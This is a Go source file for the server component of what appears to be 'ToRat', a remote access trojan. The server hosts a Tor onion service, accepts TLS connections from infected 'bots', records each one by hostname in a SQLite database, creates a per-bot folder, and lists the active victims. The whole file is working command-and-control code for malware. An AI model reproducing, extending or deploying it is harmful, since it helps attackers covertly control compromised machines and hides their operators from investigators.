package server

import (
	"context"
	"crypto/ed25519"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/rpc"
	"os"
	"path/filepath"
	"strconv"

	"github.com/cretz/bine/tor"
	torEd25519 "github.com/cretz/bine/torutil/ed25519"
	"github.com/fatih/color"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
)

var db *gorm.DB

var activeClients []activeClient

// Start runs the server
func Start() error {
	var err error // this is needed for gorm
	db, err = gorm.Open(sqlite.Open("/dist_ext/ToRat.db"), &gorm.Config{})
	if err != nil {
		log.Fatalln("Could not open db", err)
	}

	// Migrate the schema
	db.AutoMigrate(&Client{})

	cert, err := tls.LoadX509KeyPair("../../keygen/cert.pem", "../../keygen/priv_key.pem")
	if err != nil {
		return fmt.Errorf("could not load cert: %v", err)
	}

	tlsConfig := tls.Config{Certificates: []tls.Certificate{cert}}

	t, err := tor.Start(context.Background(), nil)
	if err != nil {
		return err
	}

	content, err := ioutil.ReadFile("../../keygen/hs_private")
	if err != nil {
		return err
	}

	var key ed25519.PrivateKey = content

	service, err := t.Listen(context.Background(), &tor.ListenConf{
		RemotePorts: []int{1337},
		Key:         torEd25519.FromCryptoPrivateKey(key),
	})
	if err != nil {
		return err
	}
	log.Println("Onion service running:", service.ID+".onion")

	for {
		conn, err := service.Accept()
		if err != nil {
			log.Println("accepting failed:", err)
			continue
		}
		tlsconn := tls.Server(conn, &tlsConfig)
		go accept(tlsconn)
	}
}

func accept(conn net.Conn) {
	var c activeClient

	c.RPC = rpc.NewClient(conn)

	if err := c.GetHostname(); err != nil {
		log.Println("Invalid Hostname:", err)
		return
	}
	c.Client = Client{
		Hostname: c.Hostname,
		Path:     filepath.Join("/dist_ext/bots", c.Hostname),
	}

	db.FirstOrCreate(&c.Client, Client{Hostname: c.Hostname})

	if _, err := os.Stat(c.Client.Path); err != nil {
		os.MkdirAll(c.Client.Path, os.ModePerm)
	}
	if c.Client.Name == "" {
		c.Client.Name = c.Client.Hostname
	}

	db.Save(&c.Client)
	activeClients = append(activeClients, c)
	fmt.Println(green("[Server] [+] New Client: "), blue(c.Client.Name))
}

func listConn() []string {
	var clients []string
	for i, c := range activeClients {
		str := strconv.Itoa(i) + "\t" + c.Client.Hostname + "\t" + c.Client.Name
		clients = append(clients, str)
	}
	return clients
}

func printClients() {
	color.HiCyan("Clients:")
	list := listConn()
	for _, client := range list {
		color.Cyan(client)
	}
}

func getClient(target int) *activeClient {
	return &activeClients[target]
}
